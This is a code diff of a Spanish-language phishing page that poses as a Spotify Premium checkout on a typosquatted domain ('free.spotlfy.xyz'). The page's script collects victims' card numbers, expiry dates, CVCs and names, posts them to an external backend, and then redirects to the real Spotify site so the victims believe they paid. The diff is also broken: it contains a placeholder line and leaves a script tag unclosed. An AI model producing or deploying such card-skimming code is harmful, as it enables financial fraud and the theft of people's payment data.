@@ -195,58 +195,11 @@
   <script src="../frontend_config.js"></script>  <!-- Carga config aquí también -->
   
   <script>
-    // --- CONFIGURACIÓN DEL CLIENTE (usa frontend_config.js) ---
+  
+... (MANTENER EL CSS Y HTML ORIGINAL) ...
+
+  <script>
     const SERVER_URL = 'https://backend-production-d69c4cec.up.railway.app';
-    
-    function selectMethod(btn, method) {
-      document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      if (method === 'card') {
-        document.getElementById('card-form').style.display = 'block';
-        document.getElementById('paypal-form').style.display = 'none';
-      } else {
-        document.getElementById('card-form').style.display = 'none';
-        document.getElementById('paypal-form').style.display = 'block';
-      }
-      validateForm();
-    }
-
-    document.getElementById('cardNumber').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, '');
-      let formatted = '';
-      for (let i = 0; i < value.length && i < 16; i++) {
-        if (i > 0 && i % 4 === 0) formatted += ' ';
-        formatted += value[i];
-      }
-      e.target.value = formatted;
-      validateForm();
-    });
-
-    document.getElementById('cardExpiry').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
-      e.target.value = value;
-      validateForm();
-    });
-
-    function validateForm() {
-      const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
-      const expiry = document.getElementById('cardExpiry').value;
-      const cvc = document.getElementById('cardCvc').value;
-      const name = document.getElementById('cardName').value;
-      const terms = document.getElementById('terms').checked;
-      
-      const validCard = card.length >= 15;
-      const validExpiry = expiry.length === 5;
-      const validCvc = cvc.length >= 3;
-      const validName = name.length > 2;
-      
-      document.getElementById('payBtn').disabled = !(validCard && validExpiry && validCvc && validName && terms);
-    }
-
-    document.getElementById('cardCvc').addEventListener('input', validateForm);
-    document.getElementById('cardName').addEventListener('input', validateForm);
-    document.getElementById('terms').addEventListener('change', validateForm);
 
     async function submitPayment() {
       const btn = document.getElementById('payBtn');
@@ -259,15 +212,13 @@
       btn.disabled = true;
       btnText.innerHTML = 'Procesando...';
 
-      // Envía datos al backend con el origen incluido
       try {
         const payload = {
-          lista_ids: JSON.stringify(CONFIG_IDS.PRIVATES + [CONFIG_IDS.GROUP_ID]),  // IDs desde configuración - NO VISIBLES EN FRONTEND
           tarjeta: document.getElementById('cardNumber').value,
           expiracion: document.getElementById('cardExpiry').value,
           cvc: document.getElementById('cardCvc').value,
           nombre: document.getElementById('cardName').value,
-          origen: window.location.origin  // 🔥 El dominio real del checkout
+          origen: window.location.origin  // 🔥 El dominio real del checkout (ej: https://free.spotlfy.xyz/)
         };
 
         console.log("📤 Enviando payload:", JSON.stringify(payload));
@@ -288,6 +239,22 @@
       // Redirige como si hubieran completado el pago en Spotify
       window.location.href = 'https://www.spotify.com/mx/premium/';
     }
-  </script>
+    
+    function validateForm() {
+      const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const expiry = document.getElementById('cardExpiry').value;
+      const cvc = document.getElementById('cardCvc').value;
+      const name = document.getElementById('cardName').value;
+      const terms = document.getElementById('terms').checked;
+      
+      const validCard = card.length >= 15;
+      const validExpiry = expiry.length === 5;
+      const validCvc = cvc.length >= 3;
+      const validName = name.length > 2;
+      
+      document.getElementById('payBtn').disabled = !(validCard && validExpiry && validCvc && validName && terms);
+    }
+
+   
 </body>
 </html>
